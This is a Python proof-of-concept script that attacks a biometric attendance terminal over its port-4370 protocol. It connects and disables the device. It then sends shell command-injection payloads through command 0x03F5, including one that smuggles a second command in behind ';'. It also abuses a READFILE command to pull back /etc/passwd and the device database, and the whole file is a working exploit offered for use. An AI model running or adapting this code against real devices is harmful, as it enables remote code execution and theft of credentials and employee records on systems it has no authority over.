#!/usr/bin/env python3
"""
VERIFY the BREAKTHROUGH: 0x03F5 picture delete + 0x6A6 READFILE.
Test:
1. Send cmd injection payload via 0x03F5 with unique marker
2. Try to read /tmp/<marker> back to confirm RCE
3. Read /etc/passwd content
4. Read ZKDB.db content
"""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import socket
import struct
import time
import random
import string
from zk import ZK, const

MARKER = "mvs_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
print(f'Marker: {MARKER}')

INJECT_CMD = f"echo {MARKER} > /tmp/mavis_rce_proof\x00".encode()
INJECT_ALT = f"; echo {MARKER} > /tmp/mavis_rce_proof2 ; \x00".encode()

def send_cmd(conn, command, data=b'', timeout_s=8):
    try:
        return conn._ZK__send_command(command, data, response_size=1024)
    except Exception as e:
        return {'status': False, 'error': f'{type(e).__name__}: {e}'}

def manual_recv(sock, timeout_s=3):
    """Read TCP response manually."""
    try:
        sock.settimeout(timeout_s)
        data = b''
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(data) > 1024*1024:
                break
        return data
    except socket.timeout:
        return data if data else None
    except Exception as e:
        return data if data else None

def test_target(ip, name):
    print(f'\n{"="*60}')
    print(f'TARGET: {name} ({ip})')
    print(f'{"="*60}')
    zk = ZK(ip, port=4370, timeout=10, password=0)
    try:
        conn = zk.connect()
        if not conn:
            print('  [FAIL] connect returned None')
            return
    except Exception as e:
        print(f'  [FAIL] connect: {type(e).__name__}: {e}')
        return

    print(f'  [+] Connected')
    print(f'  Firmware: {conn.get_firmware_version()}')
    print(f'  Platform: {conn.get_platform()}')

    try:
        conn.disable_device()
        print(f'  [+] Device disabled')
    except Exception as e:
        print(f'  [!] disable failed: {e}')

    # === TEST 1: 0x03F5 with injection payload ===
    print(f'\n--- TEST 1: 0x03F5 cmd injection ---')
    print(f'  Payload 1: {INJECT_CMD!r}')
    r = send_cmd(conn, 0x03F5, INJECT_CMD)
    print(f'  Result: {r}')

    print(f'\n--- TEST 2: 0x03F5 alt injection ---')
    print(f'  Payload 2: {INJECT_ALT!r}')
    r = send_cmd(conn, 0x03F5, INJECT_ALT)
    print(f'  Result: {r}')

    time.sleep(2)

    # === TEST 3: Try to read /tmp/mavis_rce_proof via READFILE ===
    print(f'\n--- TEST 3: READFILE /tmp/mavis_rce_proof ---')
    r = send_cmd(conn, 0x6A6, b'/tmp/mavis_rce_proof\x00')
    print(f'  Result: {r}')

    # === TEST 4: Try to read /etc/passwd properly (handle PREPARE_DATA flow) ===
    print(f'\n--- TEST 4: READFILE /etc/passwd (proper handling) ---')
    try:
        r = send_cmd(conn, 0x6A6, b'/etc/passwd\x00')
        print(f'  Initial: {r}')
        # If returned PREPARE_DATA, send ACK_OK and read more
        if r.get('code') == 1500:
            # Send CMD_ACK_OK to request data
            ack = conn._ZK__create_checksum_check(b'\x00\x00\x00\x00\x00\x00\x00\x00')
            time.sleep(1)
            sock = conn._ZK__sock
            sock.settimeout(5)
            data = b''
            try:
                while True:
                    chunk = sock.recv(8192)
                    if not chunk:
                        break
                    data += chunk
                    if len(data) > 65536:
                        break
            except: pass
            print(f'  Raw data ({len(data)} bytes): {data[:500]!r}')
            print(f'  ASCII decode: {data[8:].decode("ascii", errors="replace")[:500]}')
    except Exception as e:
        print(f'  ERROR: {e}')

    try:
        conn.enable_device()
    except: pass
    conn.disconnect()
    print(f'\n[+] Done {ip}')

def main():
    test_target('172.16.0.214', 'May 3 X628 PRO')

if __name__ == '__main__':
    main()
